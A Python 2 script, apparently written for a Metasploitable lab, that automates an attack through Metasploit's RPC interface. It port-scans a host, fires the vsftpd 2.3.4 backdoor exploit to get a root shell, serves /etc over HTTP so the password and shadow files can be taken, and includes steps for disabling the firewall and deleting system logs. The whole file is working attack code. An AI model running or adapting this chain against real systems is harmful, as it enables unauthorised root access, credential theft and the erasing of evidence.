from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
import os
import sys
import string
import time

#connecting to metasploit server
#make sure msdb and postgresql are up
os.system("nmap -v -n -p- 192.168.1.24 > /home/PortsAndPortTypes.txt")
os.system("gnome-terminal -e 'msfrpcd -P abc123 -f -a 127.0.0.1'")
#sleep needed to allow metasploit server to set up
time.sleep(10)
client = MsfRpcClient('abc123', ssl=True, port='55553')
console = MsfRpcConsole(client)

#setting up the use of the exploit and payload
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
exploit['RHOSTS'] = '192.168.1.24'
exploit['VERBOSE'] = True
exploit.execute(payload='cmd/unix/interact')

#sleep needed to allow session(1) (root) to connect to LHOST
time.sleep(15)
#writing the shell commands in root
shell = client.sessions.session(1)
#disabling security
print "Disabling security...\n"
#shell.write("sudo ufw disable\n")
print "Copying the password file...\n"
print "Copying the shadow password file...\n"
print "Copying port numbers and port types...\n"
time.sleep(30)
#hosting the metasploitable as a server
shell.write("cd /etc\n")
shell.write("python -m SimpleHTTPServer 55555\n")
print("Turning on server...\n")
time.sleep(10)
execfile("ReceiveData.py")
#enabling security
print "\nEnabling security...\n"
#shell.write("sudo ufw enable\n")
print "Deleting system logs...\n"
#shell.write("sudo rm /etc/syslog.conf\n")
print "Exiting session...\n"
shell.write("exit\n")
print "Killing all job processes...\n"
shell.write("jobs -K\n")
shell.write("exit\n")
shell.write("logout\n")
shell.write("^C\n")
shell.read()
print "Exploit complete\n"

